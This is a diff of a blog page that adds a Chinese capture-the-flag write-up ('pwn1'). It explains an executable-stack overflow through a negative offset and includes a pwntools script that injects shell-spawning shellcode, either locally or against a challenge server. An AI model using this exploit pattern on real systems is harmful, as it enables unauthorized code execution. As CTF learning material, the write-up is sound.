@@ -267,7 +267,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Sep 22 2025 16:17:13 GMT+0800">2025-09-22</span>
+                    <span class="datetime" data-updated="Wed Sep 24 2025 15:58:50 GMT+0800">2025-09-24</span>
                 </span>
             
         
@@ -276,7 +276,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                            <li class="category-item"><a href="/categories/wp/">wp</a></li>
                         
                     
                 </ul>
@@ -287,7 +287,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/WP/">WP</a></li>
                         
                     
                 </ul>
@@ -312,7 +312,22 @@
                     
 
                     
-                         
+                         <h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p><a href="">附件</a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250923193708943.png"  alt="image-20250923193708943"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250923194935923.png"  alt="image-20250923194935923"></p>
+<p>可以看到Stack: Executable<code>/</code>Has RWX segments允许在数据（栈或某个段）上执行代码</p>
+<p>查看执行权限</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250923195741784.png"  alt="image-20250923195741784"></p>
+<p>vmmap：<code>0x7ffffffdd000 - 0x7ffffffff000 rwxp [stack]</code></p>
+<p>任何 <code>0x7ffffffdd000 &lt;= addr &lt; 0x7ffffffff000</code> 的地址都属于“可执行栈页” → 可执行。</p>
+<p>gdb调试看buf的范围</p>
+<p>可以看到dest的地址和ret的地址位置一样，想到把放置shellcode的位置放过去执行</p>
+<p>且这个位置需要再在buf之内，方便后续对buf的写入</p>
+<p>在栈上查找发现buf的-0xf0处的地址符合要求</p>
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">file_path = &quot;./way&quot;</span><br><span class="line">remote_host = &quot;node5.buuoj.cn&quot;</span><br><span class="line">remote_port = 123445</span><br><span class="line">#libc=ELF(&quot;libc.so.6&quot;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">if &#x27;re&#x27; in sys.argv:</span><br><span class="line">    p = remote(remote_host, remote_port)</span><br><span class="line">else:</span><br><span class="line">    p = process(file_path)</span><br><span class="line">    gdb.attach(p, &quot;b*0x401315&quot;)</span><br><span class="line"></span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;Where is the your home:&quot; , str(-0xf0))</span><br><span class="line">shellcode = 0x40 * b&#x27;a&#x27; + asm(shellcraft.sh())</span><br><span class="line">print(hex(len(shellcode)))</span><br><span class="line">p.sendafter(&quot;Where can you find mother:&quot; , shellcode)</span><br><span class="line">p.sendlineafter(&quot;How many moms did you find:&quot; , b&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
                     
                 </div>
 
@@ -324,7 +339,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/WP/">WP</a>
                                     </li>
                                 
                             </ul>
@@ -415,7 +430,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li></ol>
     </div>
 </div>
 
@@ -575,7 +590,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-number">1.</span> <span class="nav-text">pwn1</span></a></li></ol>
     </div>
 </div>
 
